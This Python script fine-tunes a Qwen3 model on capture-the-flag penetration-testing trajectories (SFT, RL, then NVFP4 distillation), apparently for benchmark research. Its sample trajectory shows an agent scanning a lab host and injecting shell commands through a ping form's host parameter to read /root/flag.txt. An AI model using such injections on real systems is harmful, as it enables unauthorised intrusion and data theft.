import torch
import torch.nn.functional as F
from torch.utils.data import Sampler
from transformers import AutoTokenizer, AutoModelForCausalLM
from peft import LoraConfig, get_peft_model, TaskType
from collections import defaultdict
import random
import modelopt.torch.quantization as mtq

# Swap to "Qwen/Qwen3-14B-Instruct" for real training on the server
MODEL_NAME = "Qwen/Qwen3-0.6B"
DEVICE     = "cuda" if torch.cuda.is_available() else "cpu"

print(f"Loading tokenizer: {MODEL_NAME!r}  |  device: {DEVICE}")
tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
if tokenizer.pad_token is None:
    tokenizer.pad_token = tokenizer.eos_token

VOCAB_SIZE    = tokenizer.vocab_size
MASK_TOKEN_ID = tokenizer.unk_token_id or tokenizer.pad_token_id


# --- 1. MODEL LOADING (Real LLM + LoRA) ---

def load_model() -> torch.nn.Module:
    """
    Load Qwen3 in bfloat16 and wrap with LoRA (PDF p.6 SFT pipeline: Qwen3 + LoRA).
    Only LoRA adapter weights are trainable — base model is frozen.
    Swap MODEL_NAME to Qwen3-14B-Instruct on the server with 32GB VRAM.
    """
    model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME,
        dtype=torch.bfloat16,
        device_map=DEVICE,
    )
    lora_cfg = LoraConfig(
        task_type=TaskType.CAUSAL_LM,
        r=16,
        lora_alpha=32,
        target_modules=["q_proj", "k_proj", "v_proj", "o_proj"],
        lora_dropout=0.05,
        bias="none",
    )
    model = get_peft_model(model, lora_cfg)
    model.print_trainable_parameters()
    return model


_NVFP4_CFG = mtq.NVFP4_DEFAULT_CFG  # canonical W4A4 NVFP4 recipe (Blackwell deployment)


def load_quantized_student(calibration_data: list[torch.Tensor]) -> torch.nn.Module:
    """
    Load Qwen3 as an NVFP4 QAD student via ModelOpt fake quantization.

    ModelOpt replaces each weight op with a fake-quantized version:
      Forward : W_bf16 → quantize(E2M1) → dequantize → matmul  (same as inference)
      Backward: gradient passes through quantize as identity (STE)
                → updates W_bf16 master copy directly

    No LoRA needed — the quantized weights themselves are trained.
    This is the real QAD from arXiv 2601.20088, not the QLoRA approximation.

    calibration_data is required: ModelOpt needs a forward pass to calibrate
    the per-block FP8 scales (amax values) before training begins.
    """
    model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME, dtype=torch.bfloat16, device_map=DEVICE,
    )

    def calibration_forward(model):
        for seq in calibration_data:
            with torch.no_grad():
                model(input_ids=seq)

    mtq.quantize(model, config=_NVFP4_CFG, forward_loop=calibration_forward)
    trainable = sum(p.numel() for p in model.parameters() if p.requires_grad)
    print(f"  trainable params (NVFP4 + STE): {trainable:,}")
    return model


# --- 2. ROLLOUT SYSTEM (Data Gathering Server) ---

def _serialize_message(msg: dict) -> str:
    """
    Serialize one structured turn dict to a tagged string that preserves role.
    Used by slice_trajectory to build the context token stream (PDF p.4 Step 2).
    """
    role = msg["role"]
    if role == "system":
        return f"<system>{msg['content']}</system>"
    if role == "tool":
        return f"<tool>{msg['content']}</tool>"
    if role == "assistant":
        thought    = msg.get("thought", "")
        tool_calls = msg.get("tool_calls", [])
        content    = msg.get("content", "")
        if tool_calls:
            cmd = tool_calls[0]["args"]["cmd"]
            return f"<assistant><thought>{thought}</thought><action>{cmd}</action></assistant>"
        if content:
            return f"<assistant>{content}</assistant>"
        return f"<assistant><thought>{thought}</thought></assistant>"
    return ""


def query_rollout_system():
    """
    Rollout System components (PDF p.1-2):
      - Orchestrator     : Front API, wraps other 3, sends trajectory to Train System
      - Solver           : loop_until_task_finished(Think → CMD → Observe)
      - Executor         : Kali env, parses tool message → runs CMD → returns result
      - Benchmark Platf. : start/stop containers, expose IP:Port, send task + oracles

    1 RL Epoch == 1 SFT Session: each rollout call produces one trajectory.
    """
    return {
        "task_id":        "0427",
        "bench_id":       "KBEN-01",
        "success":        True,
        "type":           "gold",
        "reward":         1.0,
        # Rule 4: 0-based turn indices of error steps → weight 0.2 (all others → 1.0)
        "error_step_ids": [],
        "turns": [
            # turn 0 — system prompt
            {
                "role":    "system",
                "content": (
                    "You are a security agent. Target: http://10.0.0.5. "
                    "Goal: retrieve the flag at /root/flag.txt. "
                    "You have shell access via the terminal tool."
                ),
            },
            # turn 1 — assistant (sample #1)
            {
                "role":       "assistant",
                "thought":    "I'll start by scanning open ports to see what services are running.",
                "tool_calls": [{"name": "shell", "args": {"cmd": "nmap -sV 10.0.0.5"}}],
            },
            # turn 2 — tool
            {
                "role":         "tool",
                "tool_call_id": "shell",
                "content":      "22/tcp open ssh  OpenSSH 8.9\n80/tcp open http Apache 2.4.52",
            },
            # turn 3 — assistant (sample #2)
            {
                "role":       "assistant",
                "thought":    "Port 80 is the obvious entry. Let me look at the web app.",
                "tool_calls": [{"name": "shell", "args": {"cmd": "curl -s http://10.0.0.5/ | head -20"}}],
            },
            # turn 4 — tool
            {
                "role":         "tool",
                "tool_call_id": "shell",
                "content":      '<form action="/ping" method="GET"><input name="host"></form>',
            },
            # turn 5 — assistant (sample #3)
            {
                "role":       "assistant",
                "thought":    "A ping form taking user input — classic command injection candidate. Let me test.",
                "tool_calls": [{"name": "shell", "args": {"cmd": 'curl -s "http://10.0.0.5/ping?host=127.0.0.1;id"'}}],
            },
            # turn 6 — tool
            {
                "role":         "tool",
                "tool_call_id": "shell",
                "content":      "PING 127.0.0.1 ... 0% loss\nuid=0(root) gid=0(root) groups=0(root)",
            },
            # turn 7 — assistant (sample #4)
            {
                "role":       "assistant",
                "thought":    "Injection confirmed, running as root. Reading the flag directly.",
                "tool_calls": [{"name": "shell", "args": {"cmd": 'curl -s "http://10.0.0.5/ping?host=127.0.0.1;cat+/root/flag.txt"'}}],
            },
            # turn 8 — tool
            {
                "role":         "tool",
                "tool_call_id": "shell",
                "content":      "PING 127.0.0.1 ... 0% loss\nflag{cmd_inj_via_ping_param}",
            },
            # turn 9 — assistant (sample #5): reflection thought, no action
            {
                "role":       "assistant",
                "thought":    "Flag retrieved.",
                "tool_calls": [],
            },
            # turn 10 — final answer (not sliced as a sample — fully masked by Rule 2)
            {
                "role":            "assistant",
                "content":         "flag{cmd_inj_via_ping_param}",
                "is_final_answer": True,
            },
        ],
    }


# --- 3. DATA PREPARATION (Slicer & Training Guidelines) ---

def _tokenize(text: str) -> list[int]:
    return tokenizer.encode(text, add_special_tokens=False)


def _mask_flag_labels(content: str) -> list[int]:
    """
    Rule 2 (PDF p.6): replace flag{...} with <mask> token in the label stream.
    Uses offset_mapping to find which tokens overlap the flag span.
    Sets those label positions to -100 (cross_entropy ignores -100 automatically).
    train_step substitutes MASK_TOKEN_ID at the same positions for the forward pass.
    """
    if "flag{" not in content:
        return tokenizer.encode(content, add_special_tokens=False)

    flag_start = content.index("flag{")
    flag_end   = content.index("}", flag_start) + 1

    encoding  = tokenizer(content, return_offsets_mapping=True, add_special_tokens=False)
    input_ids = encoding["input_ids"]
    offsets   = encoding["offset_mapping"]

    labels = list(input_ids)
    for i, (start, end) in enumerate(offsets):
        if start < flag_end and end > flag_start:
            labels[i] = -100
    return labels


def slice_trajectory(trajectory: dict) -> list[dict]:
    """
    PDF p.4, Steps 1-2: 11 turns → 5 samples.
    Each non-final assistant turn (thought + tool_calls) becomes one training sample.

    Input  = serialized message strings with role tags, joined and tokenized.
    Target = structured dict {role, content, tool_calls, meta} matching JSONL format.

    Rules applied:
      Rule 1 - Drop failed trajectories (success == False)
      Rule 2 - Mask flag token labels with -100
      Rule 3 - Tag each sample with bench_id (enforced at batch level by BenchSampler)
      Rule 4 - weight per sample: 0.2 if turn index in error_step_ids, else 1.0
      Rule 5 - (see train_step) SFT components re-used for RL; only Loss changes
    """
    if not trajectory["success"]:  # Rule 1
        return []

    bench_id       = trajectory["bench_id"]
    error_step_ids = set(trajectory.get("error_step_ids", []))
    turns          = trajectory["turns"]
    samples        = []

    for i, turn in enumerate(turns):
        if turn["role"] != "assistant" or turn.get("is_final_answer"):
            continue

        weight = 0.2 if i in error_step_ids else 1.0  # Rule 4

        context_parts = [
            _serialize_message(t)
            for t in turns[:i]
            if not t.get("is_final_answer")
        ]
        context_text = " ".join(context_parts)
        input_tokens = (
            torch.tensor([_tokenize(context_text)])
            if context_text
            else torch.zeros(1, 1, dtype=torch.long)
        )

        target_text       = _serialize_message(turn)
        target_structured = {
            "role":       "assistant",
            "content":    turn.get("thought", ""),
            "tool_calls": turn.get("tool_calls", []),
            "meta":       {"bench_id": bench_id, "turn_idx": i},
        }
        masked_labels = _mask_flag_labels(target_text)  # Rule 2

        samples.append({
            "bench_id":      bench_id,
            "input":         input_tokens,
            "target":        torch.tensor(masked_labels),
            "target_struct": target_structured,
            "weight":        weight,
        })

    return samples  # 11 turns → 5 samples (turns 1, 3, 5, 7, 9)


# --- 4. RULE 3 — BENCH SAMPLER ---

class BenchSampler(Sampler):
    """
    Rule 3 enforcement (PDF p.6):
    Every batch must come from the same bench_id only (prevents solution contamination).
    Groups all sample indices by bench_id, then yields full-group batches.
    """

    def __init__(self, samples: list[dict], batch_size: int):
        groups: dict[str, list[int]] = defaultdict(list)
        for idx, s in enumerate(samples):
            groups[s["bench_id"]].append(idx)

        self.batches: list[list[int]] = []
        for indices in groups.values():
            random.shuffle(indices)
            for j in range(0, len(indices), batch_size):
                self.batches.append(indices[j : j + batch_size])
        random.shuffle(self.batches)

    def __iter__(self):
        for batch in self.batches:
            yield from batch

    def __len__(self) -> int:
        return sum(len(b) for b in self.batches)


# --- 5. THE TRAINING ENGINE ---

def train_step(model, optimizer, sample, rewards, mode="sft"):
    """
    PDF p.5: SFT and RL training modes.
      mode='sft' → Weighted SFT loss
      mode='rl'  → Weighted SFT * Advantage   (same components, only loss changes — Rule 5)

    SFT flow : Gather Data → SFT Loss until full epoch → Benchmark Checkpoints
    RL  flow : Gather Data & Eval → SFT * A → loop until max epoch
    """
    input_ids  = sample["input"].to(DEVICE)   # (1, context_len)
    target_ids = sample["target"].to(DEVICE)  # (target_len,)

    # Replace -100 (flag mask) with MASK_TOKEN_ID for the forward pass (Rule 2)
    target_input = target_ids.clone()
    target_input[target_input == -100] = MASK_TOKEN_ID
    seq = torch.cat([input_ids, target_input.unsqueeze(0)], dim=1)  # (1, C+T)

    # Labels: -100 for context; target_ids preserves -100 for flag tokens (Rule 2)
    # HF causal LM shifts internally: logits[i] predicts labels[i+1]
    context_mask = torch.full((1, input_ids.size(1)), -100, dtype=torch.long, device=DEVICE)
    labels       = torch.cat([context_mask, target_ids.unsqueeze(0)], dim=1)

    outputs  = model(input_ids=seq, labels=labels)
    sft_loss = outputs.loss * sample["weight"]  # weighted cross-entropy (Rule 4)

    # RL ADVANTAGE (PDF p.5): A = (r_i − mean) / std; A < 0 → model forgets bad traj
    rewards_t = torch.tensor(rewards, dtype=torch.float)
    advantage = (rewards[-1] - rewards_t.mean()) / (rewards_t.std() + 1e-6)
    rl_loss   = sft_loss * advantage  # L_RL = L_SFT * A

    total_loss = sft_loss if mode == "sft" else rl_loss  # Rule 5

    optimizer.zero_grad()
    total_loss.backward()
    optimizer.step()
    return total_loss.item()


# --- 6. QAD — POST-TRAINING QUANTIZATION RECOVERY ---

def _build_calibration_data(training_samples: list[dict]) -> list[torch.Tensor]:
    """
    QAD only needs raw token sequences — no labels, no masking.
    We reuse the trajectory input tokens already built by slice_trajectory.
    Any general text works; the paper uses a mixture of SFT + RL prompt data.
    """
    return [s["input"].to(DEVICE) for s in training_samples]


def qad_finetune(
    teacher_model: torch.nn.Module,
    student_model: torch.nn.Module,
    calibration_data: list[torch.Tensor],
    steps: int = 100,
    lr: float = 1e-6,      # lower than SFT/RL — STE gradients through 4-bit can be noisy
    temperature: float = 2.0,  # softens distributions, prevents log_softmax → -inf → nan
) -> None:
    """
    Quantization-Aware Distillation (QAD) — arXiv 2601.20088, NVIDIA 2026.

    Stage: runs AFTER SFT + RL. Not part of the training loop.

    Goal: recover accuracy lost when quantizing the trained BF16 model to NVFP4
    (E2M1 4-bit float, Blackwell Tensor Core native format).

    How it differs from SFT and RL:
      SFT loss = cross_entropy(student_logits, hard_labels)   ← target tokens only
      RL  loss = SFT_loss * advantage                         ← target tokens only
      QAD loss = KL(p_teacher || p_student)                   ← ALL token positions
                                                                 soft targets
                                                                 no labels needed

    Why soft targets beat hard targets:
      SFT trains on one-hot labels: "correct = nmap".
      QAD trains on teacher's full distribution: "nmap=60%, curl=20%, ping=8%..."
      The full distribution encodes uncertainty and alternatives — more signal per token.

    Why ALL positions (no masking):
      SFT masks context tokens (no loss on input) — only trains assistant output.
      QAD has no concept of input vs output — it matches teacher everywhere.
      More gradient signal per sequence → faster convergence with less data.

    Forward KL vs Reverse KL:
      Forward KL: KL(p_teacher || p_student) — mode-covering, student covers all
                  modes the teacher assigns probability to. Standard choice for distillation.
      Reverse KL: KL(p_student || p_teacher) — mode-seeking, student collapses to one mode.
      QAD uses forward KL. Implemented as:
        F.kl_div(log_softmax(student), softmax(teacher), reduction='batchmean')

    Why no LoRA (vs old NF4+QLoRA approach):
      ModelOpt's STE lets gradients flow through the NVFP4 quantized weights directly.
      The actual quantized weights are updated — no adapter mismatch at inference.
    """
    teacher_model.eval()   # frozen — no gradients ever flow through teacher
    student_model.train()

    optimizer = torch.optim.AdamW(student_model.parameters(), lr=lr)

    for step, seq in enumerate(calibration_data * (steps // len(calibration_data) + 1)):
        if step >= steps:
            break

        # Teacher forward — torch.no_grad() ensures zero memory for gradients
        with torch.no_grad():
            teacher_logits = teacher_model(input_ids=seq).logits  # (1, T, V)

        # Student forward — gradients flow through quantized weights via STE
        student_logits = student_model(input_ids=seq).logits      # (1, T, V)

        # Clamp before softmax — 4-bit fake-quantization can produce extreme logits
        # that make log_softmax → -inf → KL → nan even before backward runs
        student_logits = student_logits.clamp(-100, 100)
        teacher_logits = teacher_logits.clamp(-100, 100)

        # Temperature scaling (Hinton et al. 2015):
        # Divide logits by T before softmax → softer distributions.
        # Prevents extreme logit values from making log_softmax → -inf → nan.
        # Multiply loss by T² to preserve gradient magnitude.
        kl_loss = F.kl_div(
            F.log_softmax(student_logits / temperature, dim=-1),
            F.softmax(teacher_logits  / temperature, dim=-1),
            reduction="batchmean",
        ) * (temperature ** 2)

        if torch.isnan(kl_loss):
            print(f"[QAD] step={step:3d}  kl_loss=nan — stopping (gradient instability)")
            break

        optimizer.zero_grad()
        kl_loss.backward()
        # Gradient clipping — STE can produce sharp gradients for weights near
        # quantization grid boundaries; clipping prevents explosion
        torch.nn.utils.clip_grad_norm_(student_model.parameters(), max_norm=1.0)
        optimizer.step()

        if step % 10 == 0:
            print(f"[QAD] step={step:3d}  kl_loss={kl_loss.item():.4f}")


if __name__ == "__main__":
    # ── STAGE 1 & 2: SFT / RL ──────────────────────────────────────────────
    # BF16 model + LoRA — this is the teacher for QAD later
    bf16_model = load_model()
    optimizer  = torch.optim.AdamW(bf16_model.parameters(), lr=1e-4)

    reward_history = [0.5, 0.7]

    # Rollout: Orchestrator queries Solver + Executor + Benchmark Platform
    raw_trajectory = query_rollout_system()
    reward_history.append(raw_trajectory["reward"])

    # Slice: 11 turns → 5 samples
    training_samples = slice_trajectory(raw_trajectory)
    print(f"\nSliced {len(training_samples)} samples from trajectory {raw_trajectory['task_id']}")

    # BenchSampler enforces Rule 3: same bench_id per batch
    sampler = BenchSampler(training_samples, batch_size=2)
    print(f"BenchSampler batches: {sampler.batches}\n")

    # SFT phase (swap mode='rl' for RL phase — same loop, only loss changes)
    for sample in training_samples:
        loss = train_step(bf16_model, optimizer, sample, reward_history, mode="sft")
        print(
            f"[SFT] bench={sample['bench_id']}  "
            f"weight={sample['weight']}  "
            f"turn_idx={sample['target_struct']['meta']['turn_idx']}  "
            f"loss={loss:.4f}"
        )

    # ── STAGE 3: QAD ───────────────────────────────────────────────────────
    # After SFT+RL: quantize to NVFP4 via ModelOpt (E2M1, Blackwell-native format),
    # then recover accuracy via KL distillation from the frozen BF16 teacher.
    # ModelOpt's STE makes the quantized weights directly trainable — no LoRA.
    #
    # Calibration data is built first because ModelOpt's PTQ step needs a
    # forward pass to calibrate per-block FP8 scales before training begins.
    calibration_data = _build_calibration_data(training_samples)

    print("\n[QAD] Loading NVFP4 student via ModelOpt...")
    student_model = load_quantized_student(calibration_data)

    print(f"[QAD] Starting distillation — teacher=BF16, student=NVFP4, steps=20")
    qad_finetune(
        teacher_model    = bf16_model,
        student_model    = student_model,
        calibration_data = calibration_data,
        steps            = 20,     # tiny for mental model; real run uses 100-500 steps
        lr               = 1e-6,   # conservative — STE gradients can still be noisy
        temperature      = 2.0,    # soften distributions to prevent nan
    )
    print("\n[QAD] Done. Student matches teacher distribution at NVFP4 precision.")